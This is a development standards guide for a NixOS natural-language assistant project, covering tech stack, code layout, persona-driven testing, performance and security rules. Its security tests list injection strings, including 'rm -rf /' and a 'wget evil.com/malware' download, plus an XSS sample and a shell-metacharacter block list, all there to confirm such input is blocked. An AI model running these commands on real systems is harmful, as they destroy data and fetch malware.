# 🎯 Development Standards - Nix for Humanity

*The definitive guide to stop recreating the wheel*

---

💡 **Quick Context**: Essential technical standards and patterns to prevent wheel recreation  
📍 **You are here**: Development → Code Standards (Technical Reference)  
🔗 **Related**: [Quick Start](./03-QUICK-START.md) | [Sacred Trinity Workflow](./02-SACRED-TRINITY-WORKFLOW.md) | [Master Documentation Map](../MASTER_DOCUMENTATION_MAP.md)  
⏱️ **Read time**: 15 minutes  
📊 **Mastery Level**: 🌿 Intermediate - requires development experience and project familiarity

🌊 **Natural Next Steps**:
- **For new developers**: Start with [Quick Start Guide](./03-QUICK-START.md) first, then return here
- **For contributors**: Continue to [Testing Guide](./05-TESTING-GUIDE.md) after mastering these standards  
- **For architects**: Review [System Architecture](../02-ARCHITECTURE/01-SYSTEM-ARCHITECTURE.md) for context
- **For reviewers**: Use this as checklist during code review process

---

## 🚨 READ THIS FIRST - Every Session!

Before writing ANY code:
1. **CHECK** if it already exists in `implementations/`
2. **REUSE** existing patterns and code
3. **FOLLOW** these standards exactly
4. **DON'T** create new frameworks or patterns

*Sacred Humility Context: These development standards represent our current understanding of effective practices within our specific Sacred Trinity development model. While our patterns have proven successful in our context, they require validation across diverse development environments and team structures. We remain open to evolution and improvement based on broader community feedback and changing technical landscapes.*

## 📋 Tech Stack (FINAL - No More Debates!)

```yaml
Frontend:
  Language: TypeScript            # NOT JavaScript
  Framework: None                 # Vanilla modules only
  UI: Adaptive DOM manipulation   # No React/Vue/Svelte
  Build: esbuild                  # Fast and simple
  Styles: Vanilla CSS             # No Tailwind/preprocessors

Backend:
  Runtime: Node.js 20+            # NOT Deno or Bun
  Framework: None                 # Just http module
  Database: SQLite                # Local-first, no PostgreSQL
  Execution: child_process.spawn  # Direct, no abstractions

Desktop:
  Framework: Tauri                # DECIDED - not Electron
  Language: Rust + TypeScript     # Standard Tauri stack
  IPC: Tauri commands             # Built-in system

Testing:
  Runner: Node test runner        # Built-in, no Jest/Mocha
  Assertions: Node assert         # Built-in, no Chai
  Coverage: c8                    # If needed
  Philosophy: Test behavior       # Not implementation
  
  # Test file patterns:
  NLP Package: test/**/*.test.ts  # Uses Node.js test runner
  Web Implementation: Jest        # Already configured there
  Convention: *.test.ts           # TypeScript test files

Architecture:
  Pattern: Modular packages       # Clear boundaries
  Style: Functional + Classes     # Functions default, classes for state
  Imports: ES modules             # No CommonJS
  Organization: Feature-based     # Not layer-based
```

## 🏗️ Code Organization

### NixOS Shebang Standards
```bash
# ✅ CORRECT for NixOS (portable):
#!/usr/bin/env bash
#!/usr/bin/env node
#!/usr/bin/env python3

# ❌ WRONG (breaks on NixOS):
#!/bin/bash
#!/usr/local/bin/node
#!/usr/bin/python3
```

**Remember**: Always use `#!/usr/bin/env <interpreter>` for portability!

### Package Structure (Use This!)
```
packages/
├── core/                         # Shared utilities ONLY
│   ├── types/                   # TypeScript types
│   ├── constants/               # Shared constants
│   ├── errors/                  # Error types
│   └── utils/                   # Pure utilities
│
├── nlp/                         # ALL NLP code here
│   ├── intent-engine/           # Intent recognition
│   ├── fuzzy-matcher/           # Typo correction
│   ├── context-tracker/         # Conversation state
│   ├── error-recovery/          # Smart suggestions
│   └── index.ts                 # Main NLP export
│
├── executor/                    # ALL command execution
│   ├── validator/               # Safety checks
│   ├── builder/                 # Command construction
│   ├── sandbox/                 # Execution environment
│   └── index.ts                 # Main executor export
│
├── patterns/                    # Single source of truth
│   └── index.ts                 # ALL patterns here
│
└── ui/                          # ALL UI code
    ├── cli/                     # Terminal interface
    ├── adaptive/                # Adaptive UI system
    └── components/              # Shared UI components
```

### File Conventions
```typescript
// One concept per file
// Clear exports
// No side effects

// ✅ GOOD: packages/nlp/intent-engine/index.ts
export class IntentEngine {
  async recognize(input: string): Promise<Intent> {
    // Implementation
  }
}

// ❌ BAD: Mixing concerns
class IntentEngine { }
class FuzzyMatcher { }  // Should be separate file
console.log('Loaded');  // No side effects!
```

## 🎭 Personas - How to Use Correctly

### ✅ RIGHT: Design Validation
```typescript
// When designing any feature, ask:
// 1. Would Grandma Rose (75) understand this message?
// 2. Is this fast enough for Maya (16, ADHD)?
// 3. Can Viktor (67, ESL) parse this language?
// 4. Will this stress David (42, tired parent)?

// Example: Error messages
function getErrorMessage(error: Error): string {
  // Think: "How would each persona react?"
  return "I couldn't do that. Want to try something else?";
  // NOT: "ENOENT: no such file or directory"
}
```

### ❌ WRONG: Implementation Features
```typescript
// DON'T create persona systems!
class PersonaDetector { }  // NO!
class PersonalityAdapter { }  // NO!

// Personas are for OUR design thinking
// NOT for the code to implement
```

### ✅ RIGHT: Test Scenarios
```typescript
// Use personas to create test cases
describe('Voice Commands', () => {
  test('Grandma Rose: Natural speech', async () => {
    const result = await processInput("I need that Firefox thing");
    expect(result.intent).toBe('install');
    expect(result.package).toBe('firefox');
  });

  test('Maya: Speed requirement', async () => {
    const start = performance.now();
    await processInput("install firefox");
    expect(performance.now() - start).toBeLessThan(1000);
  });
});
```

## 🚫 Stop Doing These!

### 1. **Creating New NLP Engines**
```typescript
// ❌ STOP creating new NLP systems
class MyNewNLPEngine { }  // NO!

// ✅ Use existing
import { NLPEngine } from '@nix-humanity/nlp';
```

### 2. **Defining Patterns Everywhere**
```typescript
// ❌ STOP scattering patterns
const INSTALL_PATTERNS = [/install/];  // NO!

// ✅ Use central registry
import { PATTERNS } from '@nix-humanity/patterns';
```

### 3. **Adding Dependencies**
```json
// ❌ STOP adding frameworks
"dependencies": {
  "express": "^4.0.0",     // NO! Use http
  "jest": "^29.0.0",       // NO! Use node:test
  "react": "^18.0.0"       // NO! Use vanilla
}

// ✅ Minimal dependencies
"dependencies": {
  "sqlite3": "^5.0.0"      // OK - needed for local DB
}
```

### 4. **Complex Build Processes**
```json
// ❌ STOP complex builds
"scripts": {
  "build": "webpack && babel && rollup"  // NO!
}

// ✅ Simple and fast
"scripts": {
  "build": "esbuild src/index.ts --bundle --outdir=dist"
}
```

## 📝 Development Workflow

### Starting a New Feature
```bash
# 1. Check existing code
find implementations/ -name "*.ts" | xargs grep -l "similar-feature"
find packages/ -name "*.ts" | xargs grep -l "similar-feature"

# 2. Read relevant docs
cat docs/technical/NLP_ARCHITECTURE.md
cat docs/technical/ARCHITECTURE.md

# 3. Use existing patterns
# DON'T create new ones!

# 4. Test with persona thinking
# "Would all 10 personas succeed with this?"
```

### Code Review Checklist
- [ ] Uses existing NLP engine (not creating new)
- [ ] Follows TypeScript (not JavaScript)
- [ ] No new dependencies added
- [ ] Patterns from central registry
- [ ] Tested with persona scenarios
- [ ] No complex abstractions
- [ ] Clear, single-purpose files

## 🧪 Testing Standards

### Testing Philosophy
**"Test behavior at the boundaries, implementation at the core"**

We DO test implementation - just smartly:
- **Public APIs**: Test behavior and contracts
- **Algorithms**: Test implementation thoroughly
- **Integration**: Test data flow between components
- **User Journeys**: Test outcomes and experience

### Test Pyramid
```
        /\
       /E2E\      (10%) - Full user journeys
      /------\
     /Integr. \   (30%) - Component integration  
    /----------\
   /   Unit     \ (60%) - Functions, classes, algorithms
  /--------------\
```

### Coverage Requirements
- **Overall**: 80% minimum
- **Critical Paths**: 95% (NLP, command execution)
- **Algorithms**: 100% (fuzzy matching, learning)
- **Error Paths**: 90% (all errors handled)

### What to Test

#### ✅ Unit Tests - Test Implementation
```typescript
// Test algorithmic correctness
describe('Fuzzy Matcher', () => {
  test('calculates edit distance correctly', () => {
    expect(fuzzyMatch.distance('firefox', 'firefx')).toBe(1);
    expect(fuzzyMatch.distance('install', 'instal')).toBe(1);
  });
  
  test('ranking algorithm works correctly', () => {
    const matches = fuzzyMatch.rank('fierfix', ['firefox', 'chrome', 'firejail']);
    expect(matches[0].match).toBe('firefox');
    expect(matches[0].score).toBeGreaterThan(0.8);
  });
});

// Test state management
describe('Context Tracker', () => {
  test('maintains conversation state correctly', () => {
    tracker.addContext('searched for firefox');
    tracker.addContext('user wants browser');
    
    const context = tracker.getRelevantContext('install it');
    expect(context.likelyPackage).toBe('firefox');
    expect(context.confidence).toBeGreaterThan(0.7);
  });
});

// Test data structures
describe('Learning System', () => {
  test('stores preferences with proper structure', async () => {
    await learner.recordPreference('editor', 'neovim');
    const stored = await db.get('preferences.editor');
    
    expect(stored).toMatchObject({
      value: 'neovim',
      count: 1,
      lastUsed: expect.any(Date),
      confidence: expect.any(Number)
    });
  });
});
```

#### ✅ Integration Tests - Test Component Interaction
```typescript
// Test component integration
describe('NLP → Command Builder → Executor', () => {
  test('full pipeline processes commands correctly', async () => {
    const input = "please install that firefox thing";
    
    const intent = await nlp.parse(input);
    expect(intent.action).toBe('install');
    expect(intent.target).toBe('firefox');
    
    const command = await builder.build(intent);
    expect(command.safe).toBe(true);
    expect(command.nixCommand).toContain('firefox');
    
    const result = await executor.run(command);
    expect(result.success).toBe(true);
  });
});
```

#### ✅ E2E Tests - Test User Experience
```typescript
// Test persona scenarios
describe('Persona Journeys', () => {
  testAllPersonas('can install software', async (persona) => {
    const result = await system.process(persona.typicalCommand);
    expect(result.understood).toBe(true);
    expect(result.succeeded).toBe(true);
    expect(result.responseTime).toBeLessThan(persona.acceptableDelay);
  });
});
```

### Performance Testing
```typescript
describe('Performance Requirements', () => {
  test('startup time under 3 seconds', async () => {
    const start = Date.now();
    await system.initialize();
    expect(Date.now() - start).toBeLessThan(3000);
  });
  
  test('command processing under 2 seconds', async () => {
    const timings = [];
    for (const cmd of commonCommands) {
      const start = Date.now();
      await system.process(cmd);
      timings.push(Date.now() - start);
    }
    expect(Math.max(...timings)).toBeLessThan(2000);
  });
  
  test('memory usage stays under budget', async () => {
    const baseline = process.memoryUsage().heapUsed;
    
    // Process 100 commands
    for (let i = 0; i < 100; i++) {
      await system.process(`install package${i}`);
    }
    
    const used = process.memoryUsage().heapUsed - baseline;
    expect(used).toBeLessThan(300 * 1024 * 1024); // 300MB
  });
});
```

### Security Testing
```typescript
describe('Security Boundaries', () => {
  test('prevents command injection', async () => {
    const maliciousInputs = [
      'install firefox; rm -rf /',
      'install `rm -rf /`',
      'install $(dangerous command)',
      'install && wget evil.com/malware'
    ];
    
    for (const input of maliciousInputs) {
      const result = await system.process(input);
      expect(result.blocked).toBe(true);
      expect(result.reason).toContain('security');
    }
  });
  
  test('sanitizes all outputs', async () => {
    const result = await system.process('install <script>alert("xss")</script>');
    expect(result.display).not.toContain('<script>');
    expect(result.sanitized).toBe(true);
  });
});
```

### Accessibility Testing
```typescript
describe('Accessibility Requirements', () => {
  test('all responses work with screen readers', async () => {
    const response = await system.process('install firefox');
    expect(response.screenReaderText).toBeDefined();
    expect(response.ariaLive).toBe('polite');
  });
  
  test('keyboard navigation complete', async () => {
    const ui = await renderUI();
    const focusableElements = ui.querySelectorAll('[tabindex]');
    expect(focusableElements.length).toBeGreaterThan(0);
    // Test tab order is logical
  });
});
```

### Test Utilities
```typescript
// Shared test helpers
export const testAllPersonas = (description: string, testFn: (persona: Persona) => Promise<void>) => {
  for (const persona of ALL_PERSONAS) {
    test(`${persona.name} - ${description}`, async () => {
      await testFn(persona);
    });
  }
};

export const measurePerformance = async (fn: Function) => {
  const start = performance.now();
  const result = await fn();
  const duration = performance.now() - start;
  return { result, duration };
};
```

## 🎯 Pattern Registry

### All Patterns in ONE Place
```typescript
// packages/patterns/index.ts
export const PATTERNS = {
  install: {
    patterns: [
      /^(install|add|get)\s+(.+)$/i,
      /^i\s+(need|want)\s+(.+)$/i,
    ],
    examples: [
      'install firefox',
      'add nodejs',
      'i need python'
    ]
  },
  // ALL other patterns here
  // NOWHERE else!
};
```

## ⚠️ Error Handling Standards

### User-First Error Messages
```typescript
// Error structure for all user-facing errors
interface UserError {
  userMessage: string;      // What the user sees (Grandma-friendly)
  suggestions: string[];    // What they can do about it
  technical?: string;       // For debugging (never shown to user)
  learnable: boolean;      // Should system learn from this?
}

// Example implementation
class CommandError extends Error implements UserError {
  constructor(
    public userMessage: string,
    public suggestions: string[],
    public technical?: string,
    public learnable: boolean = true
  ) {
    super(userMessage);
  }
}

// Usage
throw new CommandError(
  "I couldn't find that program",
  ["Try 'search firefox' to find the right name", "Check your spelling"],
  "Package 'firefx' not found in nixpkgs",
  true
);
```

### Error Categories
```typescript
enum ErrorCategory {
  USER_INPUT = 'user_input',      // Typos, wrong syntax
  SYSTEM = 'system',              // Disk full, network down
  PERMISSION = 'permission',      // Needs sudo, locked file
  NOT_FOUND = 'not_found',       // Package/file doesn't exist
  SAFETY = 'safety'              // Dangerous operation blocked
}

// Different handling for each category
function handleError(error: CommandError, category: ErrorCategory) {
  switch (category) {
    case ErrorCategory.USER_INPUT:
      // Suggest corrections, learn patterns
      break;
    case ErrorCategory.SYSTEM:
      // Offer system diagnostics
      break;
    case ErrorCategory.PERMISSION:
      // Explain permissions simply
      break;
  }
}
```

### Recovery Patterns
```typescript
// Always provide a path forward
interface ErrorRecovery {
  immediate: string[];    // What to try right now
  alternative: string[];  // Other approaches
  learn: string[];       // What to remember
}

// Example
const recovery: ErrorRecovery = {
  immediate: ["Try 'install firefox' instead"],
  alternative: ["Search for browsers: 'search browser'"],
  learn: ["You usually mean 'firefox' when you say 'fox'"]
};
```

## ⚡ Performance Standards

### Performance Budgets (Hard Limits)
```yaml
Startup:
  Cold: < 3 seconds
  Warm: < 1 second
  
Command Processing:
  Simple (install): < 2 seconds
  Complex (search): < 3 seconds
  Feedback: < 100ms (show user something)

Resource Usage:
  Memory:
    Idle: < 150MB
    Active: < 300MB
    Peak: < 500MB
  CPU:
    Idle: < 1%
    Active: < 25%
    Peak: < 50%

Response Times by Persona:
  Maya (ADHD): < 1 second
  Grandma Rose: < 2 seconds (with clear progress)
  Everyone: < 3 seconds absolute max
```

### Performance Monitoring
```typescript
// Decorator for automatic performance tracking
function measurePerformance(target: any, propertyKey: string, descriptor: PropertyDescriptor) {
  const originalMethod = descriptor.value;
  
  descriptor.value = async function (...args: any[]) {
    const start = performance.now();
    const memStart = process.memoryUsage().heapUsed;
    
    try {
      const result = await originalMethod.apply(this, args);
      
      const duration = performance.now() - start;
      const memUsed = process.memoryUsage().heapUsed - memStart;
      
      // Alert if over budget
      if (duration > 2000) {
        console.warn(`${propertyKey} took ${duration}ms (over budget!)`);
      }
      
      return result;
    } catch (error) {
      throw error;
    }
  };
}

// Usage
class CommandProcessor {
  @measurePerformance
  async processCommand(input: string) {
    // Automatically tracked
  }
}
```

### Progressive Loading
```typescript
// Load only what's needed, when needed
class LazyLoader {
  private modules = new Map();
  
  async getModule(name: string) {
    if (!this.modules.has(name)) {
      // Load on demand
      this.modules.set(name, await import(`./modules/${name}`));
    }
    return this.modules.get(name);
  }
}

// Start fast, load as needed
async function initialize() {
  // Load only core (< 50ms)
  await loadCore();
  
  // Show UI immediately
  showInterface();
  
  // Load rest in background
  loadModulesInBackground();
}
```

## 🔒 Security Standards

### Input Validation (EVERY Input)
```typescript
// Validation pipeline for all user input
class InputValidator {
  private static readonly DANGEROUS_PATTERNS = [
    /[;&|`$]/,                    // Shell metacharacters
    /\.\.\//,                     // Path traversal
    /<[^>]+>/,                    // HTML/Script tags
    /\${.*}/,                     // Variable expansion
    /\$\(.*\)/                    // Command substitution
  ];
  
  static validate(input: string): ValidationResult {
    // Check length
    if (input.length > 1000) {
      return { valid: false, reason: 'Input too long' };
    }
    
    // Check dangerous patterns
    for (const pattern of this.DANGEROUS_PATTERNS) {
      if (pattern.test(input)) {
        return { valid: false, reason: 'Unsafe characters detected' };
      }
    }
    
    // Sanitize for safety
    const sanitized = input
      .trim()
      .replace(/[^\w\s\-\.]/g, '') // Keep only safe chars
      .substring(0, 200);          // Limit length
      
    return { valid: true, sanitized };
  }
}
```

### Command Execution Safety
```typescript
// NEVER use shell execution
import { spawn } from 'child_process';

// ❌ NEVER DO THIS
exec(`nix-env -iA ${package}`); // Shell injection risk!

// ✅ ALWAYS DO THIS
spawn('nix-env', ['-iA', package], {
  stdio: 'pipe',
  shell: false,  // Never use shell
  env: {         // Minimal environment
    PATH: '/usr/bin:/bin',
    HOME: process.env.HOME
  }
});
```

### Permission Model
```typescript
// Clear permission boundaries
enum Permission {
  READ_SYSTEM = 'read_system',
  INSTALL_PACKAGE = 'install_package',
  MODIFY_CONFIG = 'modify_config',
  NETWORK_ACCESS = 'network_access'
}

// Check before executing
class PermissionChecker {
  async checkPermission(action: string, target: string): Promise<boolean> {
    // Some actions never need permission
    if (action === 'search' || action === 'help') {
      return true;
    }
    
    // Dangerous actions need explicit consent
    if (action === 'remove' || action === 'modify') {
      return await getUserConsent(`Allow ${action} on ${target}?`);
    }
    
    return true;
  }
}
```

### Privacy Standards
```typescript
// What we NEVER collect
const NEVER_LOG = [
  'passwords',
  'personal paths (/home/*/Documents)',
  'network locations',
  'file contents',
  'command arguments with personal data'
];

// Privacy-preserving logging
function logCommand(command: string, args: string[]) {
  // Strip personal information
  const sanitizedArgs = args.map(arg => {
    if (arg.includes('/home/')) return '<home-path>';
    if (arg.includes('@')) return '<email>';
    if (arg.match(/\d{3,}/)) return '<numbers>';
    return arg;
  });
  
  logger.info('Command executed', {
    command,
    argCount: args.length,
    // Never log actual args
  });
}
```

## 📝 Documentation Standards

### Code Documentation
```typescript
/**
 * Process user input and execute appropriate NixOS commands
 * 
 * @description This is the main entry point for all user interactions.
 * Takes natural language input and converts it to safe NixOS operations.
 * 
 * @param {string} input - Natural language command from user
 * @returns {Promise<CommandResult>} Result with success/error and display text
 * 
 * @example
 * // Grandma Rose says:
 * processCommand("I need that Firefox thing")
 * // Returns: { success: true, display: "Installing Firefox for you!" }
 * 
 * @accessibility
 * - Returns screen-reader friendly messages
 * - Includes keyboard navigation hints
 * - Respects user's contrast preferences
 * 
 * @personas
 * - Tested with all 10 personas
 * - Maya: Responds in < 1 second
 * - Viktor: Uses simple English
 * - Luna: Consistent responses
 * 
 * @security
 * - Input sanitized before processing
 * - Commands run in sandbox
 * - No shell execution
 */
async function processCommand(input: string): Promise<CommandResult> {
  // Implementation
}
```

### User-Facing Documentation
```typescript
// Help text must be persona-friendly
const HELP_TEXTS = {
  install: {
    brief: "Install programs on your computer",
    examples: [
      "install firefox",
      "I need a web browser",
      "get me that Firefox thing"
    ],
    troubleshooting: [
      "If it says 'not found', try searching first",
      "Some programs have different names than expected"
    ]
  }
};

// Generate documentation from code
function generateUserGuide() {
  // Auto-generate from JSDoc + HELP_TEXTS
  // Test readability with personas
  // Include voice command variations
}
```

## 🔍 Before Creating Anything

### The STOP Protocol
```
S - Stop and think: "Does this exist?"
T - Take time to search implementations/
O - Open existing code to check
P - Proceed only if truly new
```

### Search Commands
```bash
# Find existing NLP code
find . -path "*/nlp/*" -name "*.ts"

# Find existing patterns
grep -r "patterns" --include="*.ts"

# Find existing command execution
grep -r "spawn\|exec" --include="*.ts"
```

## 📊 Architecture Decisions Record

### Why These Choices?

**TypeScript over JavaScript**
- Type safety catches errors
- Better IDE support
- Self-documenting code
- Matches Tauri frontend needs

**No Frameworks**
- Reduces complexity
- Faster startup time
- Easier to understand
- Less to break

**SQLite over PostgreSQL**
- Local-first privacy
- No server needed
- Simple deployment
- Portable data

**Tauri over Electron**
- Smaller bundle size
- Better performance
- Rust security
- Native feel

## 🚀 Implementation Priorities

### Phase 1: Core Functionality
1. Use existing NLP from `implementations/web-based/`
2. Basic command execution (10 commands)
3. Simple CLI interface
4. Local SQLite storage

### Phase 2: Desktop App
1. Tauri wrapper
2. Adaptive UI (3 stages)
3. Voice integration
4. Learning system

### Phase 3: Polish
1. Performance optimization
2. Extended command set
3. Plugin system
4. Community features

## 📋 Sacred Don'ts

1. **Don't** create new test frameworks
2. **Don't** add build complexity
3. **Don't** implement persona detection
4. **Don't** scatter pattern definitions
5. **Don't** create new abstractions
6. **Don't** add unnecessary dependencies
7. **Don't** rewrite existing code
8. **Don't** ignore these standards

## ✅ Sacred Do's

1. **Do** check for existing code first
2. **Do** reuse established patterns
3. **Do** keep it simple
4. **Do** test with persona thinking
5. **Do** maintain single sources of truth
6. **Do** write clear, focused code
7. **Do** follow TypeScript conventions
8. **Do** document the WHY, not the WHAT

## 🔄 Continuous Improvement Process

### Weekly Standards Review
```yaml
Every Friday:
  - Review any standards violations from the week
  - Identify patterns in violations
  - Discuss potential improvements
  - Update if consensus reached
```

### Standards Evolution
```typescript
// Track why standards change
interface StandardChange {
  date: Date;
  section: string;
  oldRule: string;
  newRule: string;
  reason: string;
  discussedWith: string[];
  impact: 'breaking' | 'minor' | 'clarification';
}

// Example log entry
{
  date: '2025-01-27',
  section: 'Testing',
  oldRule: 'Test behavior not implementation',
  newRule: 'Test behavior at boundaries, implementation at core',
  reason: 'Need to test algorithms thoroughly',
  discussedWith: ['team'],
  impact: 'clarification'
}
```

### Enforcement Automation
```json
// .eslintrc.js
{
  "rules": {
    "max-lines": ["error", 200],
    "complexity": ["error", 10],
    "no-eval": "error",
    "no-shell-exec": "error"
  }
}

// .prettierrc
{
  "printWidth": 100,
  "tabWidth": 2,
  "singleQuote": true
}
```

### Pre-commit Hooks
```bash
#!/bin/bash
# .git/hooks/pre-commit

# Check for console.log
if grep -r "console\.log" --include="*.ts" src/; then
  echo "❌ Remove console.log statements"
  exit 1
fi

# Check for TODO comments
if grep -r "TODO" --include="*.ts" src/; then
  echo "⚠️  Found TODO comments - create issues instead"
fi

# Run tests
npm test || exit 1

# Check performance
npm run perf-check || exit 1
```

## 📈 Metrics for Success

### Code Quality Metrics
- **Test Coverage**: > 80% (measured)
- **Performance Budgets**: Met 95% of time
- **Security Violations**: 0 in production
- **Accessibility Score**: WCAG AAA

### Developer Experience Metrics
- **Time to First PR**: < 1 day
- **Standards Violations**: < 5 per week
- **Code Reuse**: > 60% of new features
- **"Wheel Recreation": < 1 per month

### User Success Metrics
- **All Personas Successful**: 100%
- **Error Recovery Rate**: > 90%
- **Performance SLA**: 99% meet targets
- **Privacy Preserved**: 100% local

## 🎯 The Golden Rules

1. **Check First**: ALWAYS search before creating
2. **Test Everything**: Behavior AND implementation where needed
3. **Secure by Default**: Every input validated, every command sandboxed
4. **Fast for Everyone**: Especially Maya (ADHD)
5. **Clear for Everyone**: Especially Grandma Rose & Viktor
6. **Private Always**: Everything local, nothing tracked
7. **Document Why**: The reason matters more than the what
8. **Learn & Improve**: Every mistake is a chance to update standards

## 🔄 Updating These Standards

These standards can evolve, but changes require:
1. **Clear justification** with examples
2. **Team discussion** (even if team = 2)
3. **Update all affected code** (no drift)
4. **Document the change reason** (in git log)
5. **Update QUICK_REFERENCE.md** to match

### How to Propose Changes
```bash
# Create a standards change proposal
cat > standards-change-YYYY-MM-DD.md << EOF
## Proposed Change
[What to change]

## Reason
[Why this improves things]

## Impact
[What code needs updating]

## Examples
[Before and after]
EOF

# Discuss, decide, implement
```

---

*"The best code is code we don't have to write because it already exists."*

**Remember**: Standards exist to help us move faster with confidence. When they slow us down, it's time to improve them! 🌊